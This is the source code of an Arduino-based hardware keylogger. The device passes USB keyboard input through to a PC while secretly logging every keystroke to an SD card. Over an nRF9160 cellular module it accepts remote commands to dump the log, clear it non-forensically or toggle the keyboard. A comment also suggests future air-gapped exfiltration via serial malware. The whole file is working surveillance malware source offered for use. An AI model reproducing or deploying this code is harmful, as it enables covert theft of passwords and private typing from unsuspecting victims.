/*
 * At some points in the code comments will be added where needed. But in general I will describe the working here.
 * The code consist of 3 parts. The first part is the keylogger that ineracts with the USB host to recieve RAW HID values that function has too keep being called constantly so it can read the uart bus and recieve 
 * once it recieves that same data gets instantly transmitted to the pc making sure there is 0 delay in the proces. Right afther that the keystroke gets extracted from the RAW HID value and stored inside the file on the sdcard.
 * Every single stoke/combination gets stored so to minimise any losses and overfilling of buffers. The second part is the sd storing but that happens within the previous part. The third part is command that can be recieved by the nrf91
 * it constantly checks if some data comes in if it comes in it will look at the recieved command and do whats needed for that command. The SD card dump of file is intresting that it loops while dumping these means that the keyboard can type while dumping the data
 * it sends 1 keystoke per loop. If you add additional commands you have to make sure to not use any loops or timers this will cause issues only use switches and if statemens.
 * 
 * 
 * This Chip is not a secure platform do not store any identifying information.
 */

//used libaries
#include "NeoSWSerial.h"
#include "C_USBhost.h"
#include "SdFat.h" // If issues arise make sure you have installed the libary its included in the project folder. Follow documentation to install this .zip in short do the following: Sketch>Include Library>Add .Zip Library>Select .zip and your done.

#define BAUD_RATE_USB_HOST_BOARD 38400
#define NRF9160 Serial1

C_USBhost USBhost = C_USBhost(9, 8, /*debug_state*/false);

//KEYBOARD Defines
byte b;

//SD DEFINES
const uint8_t SD_CS_PIN = 4;
#define SD_CONFIG SdSpiConfig(SD_CS_PIN, DEDICATED_SPI)
SdFat sd;
File LogFile;
File DumpFile;

//FILENAME DEFINES
char* filename;
int filecount = 0;
char derp4[20]; 
char nmbr[5];
char extention[5] = ".txt";


//COMMANDHANDLER
char command[20];
int i = 0;
bool TXdone = false;
char c;

//DUMPFUNCTIONS
bool DUMPSTARTED;
bool firstloop;
int loopcount;

//KEYOFF
bool keytoggle = false;

//kan denk ik wat netter
char* setlogname(int filecount){ 
  memset(derp4, 0, sizeof(derp4));
  itoa(filecount, nmbr, 10);
  strcat(derp4, nmbr);
  strcat(derp4, extention);
  return derp4;
}

void setup() {
  digitalWrite(11, HIGH);
  Serial.begin(115200); // Serial communnication setup with PC not need, In future can be used for exfill from machine ICA a piece of maleware that extracts threw serial and communicates airgapped
  NRF9160.begin(115200); // Communication with NRF91
  USBhost.Begin(BAUD_RATE_USB_HOST_BOARD); // Communication with usbhost
  Keyboard.begin();
  digitalWrite(11, LOW);
  if (!sd.begin(SD_CONFIG)) {
  }
  //GetLastFile();
  filename = setlogname(filecount);
  LogFile.open(filename, O_RDWR | O_APPEND | O_CREAT);
}

void KEYSTORE(){
  switch(b){
    case 9:   LogFile.print("<~T>"); break;
    case 10:  LogFile.print("<~R>");  break;
    case 28:  LogFile.print("<~PS>"); break;
    case 29:  LogFile.print("<~SL>"); break;
    case 30:  LogFile.print("<~PE>"); break;
    case 31:  LogFile.print("<~C>");  break;
    case 128: LogFile.print("<~R>");  break;
    case 129: LogFile.print("<~E>");  break;
    case 130: LogFile.print("<~B>");  break;
    case 131: LogFile.print("<~T>");  break;
    case 132: LogFile.print("<F1>");  break;
    case 133: LogFile.print("<F2>");  break;
    case 134: LogFile.print("<F3>");  break;
    case 135: LogFile.print("<F4>");  break;
    case 136: LogFile.print("<F5>");  break;
    case 137: LogFile.print("<F6>");  break;    
    case 138: LogFile.print("<F7>");  break;
    case 139: LogFile.print("<F8>");  break;
    case 140: LogFile.print("<F9>");  break;
    case 141: LogFile.print("<F10>");  break;
    case 142: LogFile.print("<F11>");  break;
    case 143: LogFile.print("<F12>");  break;
    case 144: LogFile.print("<~I>");  break;
    case 145: LogFile.print("<~H>");  break;
    case 146: LogFile.print("<~PU>");  break;
    case 147: LogFile.print("<~D>");  break;
    case 148: LogFile.print("<END>");  break;
    case 149: LogFile.print("<~PD>");  break;
    case 150: LogFile.print("<~RA>");  break;
    case 151: LogFile.print("<~LA>");  break;
    case 152: LogFile.print("<~DA>");  break;
    case 153: LogFile.print("<~UA>");  break;
    case 154: LogFile.print("<~R>");  break;
    case 240: LogFile.print("<~S>");  break;
    case 241: LogFile.print("<~CT>");  break;
    case 242: LogFile.print("<~A>");  break;
    case 243: LogFile.print("<~W>");  break;
    default:  LogFile.print(char(b)); break;
    }
    LogFile.flush();
}

void loop() { //DO NOT USE TIME
  b = USBhost.GetKey(); //look for recieved keys and send key has to becalled as much as possible
  if(b){ // KEYSTROKE HANDLER
    KEYSTORE();
    return;
  }
  else if(NRF9160.available() > 0){ //Check if nrf91 has send any command
    c = char(NRF9160.read());  
    if(c == 0){
        TXdone = true;
        i = 0;
        return; 
    }
    else if(c != 0){
        command[i++] = c;
        return;
    }
    return;                                                                   
  }
  else if(TXdone == true){ //Process commands that have been recieved 
    if(DUMPSTARTED == true){
       //DUMPFULLSD HANDLER
       if(firstloop == true){
            firstloop = false;
            DumpFile.open(filename, O_READ);
            return;
         } 
       else if((strstr(command, "DUMPFULLSD")!= NULL) || (strstr(command, "PUBSUC6")!= NULL)){ 
         if(loopcount > 2000){
            loopcount = 0;
            memset(command, 0, sizeof(command));
            TXdone = false;
            NRF9160.write("\r\r\n");
            return;
         }else if(DumpFile){
           if(DumpFile.available()){
              NRF9160.write(DumpFile.read());
              loopcount++;
              return;
           }
           else{
              loopcount = 0;
              memset(command, 0, sizeof(command));
              DUMPSTARTED = false;
              TXdone = false;
              DumpFile.close();
              NRF9160.write("DONE\r\n");
              return;
           }
           return;
         }
       }
       return;
    }
    else if(DUMPSTARTED == false){
        //COMMAND HANDLER
        if((strstr(command, "DUMPFULLSD")!= NULL)){
            DUMPSTARTED = true;
            firstloop = true;
            return;   
        }
        else if((strstr(command, "CLEARSD")!= NULL)){ // Remove file from sd card this is not forensic just visual.
            memset(command, 0, sizeof(command));
            TXdone = false;
            LogFile.remove();
            LogFile.close();
            LogFile.open(filename, O_RDWR | O_APPEND | O_CREAT);
            return;
        }
        else if((strstr(command, "TOGGLEKEYBOARD")!= NULL)){ // Turn off keyboard using the onboard switch this is as easy as pulling pin 11 high. This will report back the state to the nrf91
          memset(command, 0, sizeof(command));
          TXdone = false;
          if(keytoggle == false){
            digitalWrite(11, HIGH);
            NRF9160.print("KEYOFF");
            keytoggle = 1;
            return;
            }
          else{
            digitalWrite(11, LOW);
            NRF9160.print("KEYONN");
            keytoggle = false;
            return;
          }
        return;
        }
      return;
    }
    return;
  }
}

//Like we say in dutch, Werkze
